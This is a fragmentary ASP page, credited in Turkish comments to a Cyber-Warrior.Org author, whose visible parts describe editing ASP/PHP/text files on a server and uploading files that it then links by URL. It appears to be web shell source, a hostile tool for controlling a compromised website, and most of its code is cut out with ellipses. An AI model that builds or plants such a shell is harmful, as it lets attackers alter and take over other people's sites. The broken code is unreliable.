...
<%
' ####
' ### Code Hunters TIM / Yunus Talip Bozlağan Tarafından Cyber-Warrior.Org için yazılmıştır. / 14.07.2011
' ####
...
<body>
<br><br><br><br>
<div id="baslik" align="center"><img src="http://teknolojiport.org/1.jpg" style="cursor:pointer" alt="Hakkımızda" title="Hakkımızda" onclick="CodeHuntersPopup()"></div><br>
<br>
<%
...
'	Text, Asp, Php Gibi Uzantılı Yazı Içerikli Dosyaların Içeriğini Düzenleyen Sayfa)
	...
	'Dosya içeriğine formdan yollanan yazı yazılıyor
		...
		for i = 1 to oFO.FileCount
			...
			Else
				...
				If oFile.UploadSuccessful Then
					...
					Response.Write(" - Dosyanin su an bulunduğu URL:<a href="""&oFile.URLPath&"""><font color=""red"">"&	oFile.URLPath & "</font></a><BR>")
